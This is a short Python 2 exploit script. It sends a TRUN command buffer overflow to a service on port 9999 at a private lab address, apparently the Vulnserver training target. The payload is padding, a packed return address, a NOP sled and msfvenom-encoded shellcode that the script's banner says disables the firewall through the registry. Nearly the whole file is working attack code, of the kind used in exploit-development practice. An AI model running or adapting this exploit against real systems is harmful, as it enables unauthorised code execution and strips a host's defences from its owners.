import socket
import struct

print "\nTRUN Command - Disable firewall in Registry\n"

ip_addr = '192.168.199.130'
port = 9999

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip_addr, int(port)))

except Exception as e:
    print "[-] Failed to connect to service %s" % e

else:
    print "[+] Connected to server"

    # Get banner response
    data = s.recv(1024)
    print(data)

    # ./compile.sh disable_firewall 
    # perl -e 'print "<shellcode>"' > disable_firewall.bin 
    # cat disable_firewall.bin | msfvenom -b '\x00'
    buf = (
    "\xb8\xef\x20\xae\xd5\xd9\xf7\xd9\x74\x24\xf4\x5b\x29\xc9"
    "\xb1\x36\x31\x43\x15\x83\xc3\x04\x03\x43\x11\xe2\x1a\x11"
    "\x7c\x5c\x03\xdb\x97\xde\x27\xcc\x97\xe0\xb7\xbf\xff\x86"
    "\xde\x53\x65\x2f\x44\xfc\x17\xc0\xec\x92\xb3\x7f\x9e\x02"
    "\x60\xd3\x2a\xb2\xf0\xbf\xbb\x57\x78\x28\x57\xf4\x2a\xc7"
    "\xcf\x76\xae\x60\x6e\x1f\x43\xd3\x36\xb6\xcb\x8e\xc2\x2d"
    "\x7e\x39\x4b\xdc\x1f\xd4\xe3\x53\x93\x7a\xa3\xfb\x12\xe0"
    "\x20\x99\xfc\x87\xd4\x04\x99\x2f\x6b\x9b\x32\xd8\xe3\x55"
    "\xdc\x7b\x96\xf1\x42\x2f\x3d\x70\x13\xa3\xee\x11\x97\x53"
    "\x7e\xae\x25\xcb\x16\x20\xbe\x50\x89\xd4\x4b\x25\x27\x40"
    "\xdc\x8c\x8a\xd6\x5f\x67\x47\xbe\x0c\x23\xee\xa2\x82\x0b"
    "\xa0\x75\xb5\xe3\x7f\x7a\x3a\xf4\x2f\x2a\x14\xa6\xa7\xc8"
    "\x94\x46\xb7\x75\x70\xaf\x6a\xf2\x86\xe0\xfc\x91\x14\x01"
    "\xfc\x01\x97\x64\x8b\xb0\x3f\x0b\x16\x75\xa9\xbb\x9d\x17"
    "\x48\x5e\x94\x0e\xbb\x57\xce\xce\xbc\x67\x0e\x46\x5d\x56"
    "\xce\x30\x9a\x99\xce\xc0\xf3\xf1\xca\xc0\xf3\x01\x82\x96"
    "\x0c\x36\x9a\xc0\x19\xe4\xad\x11\x0d\xe8\x66\x56\xb9\x7b"
    "\x55\xd1\x39\x53" )

    evil_buf = "TRUN /.:/"
    evil_buf += 'A'*2003 + struct.pack("<I", 0x625011AF) + '\x90'*32 + buf 

    bytes_sent = s.send(evil_buf)
    print "Sent %s bytes" % bytes_sent


finally:
    s.close()
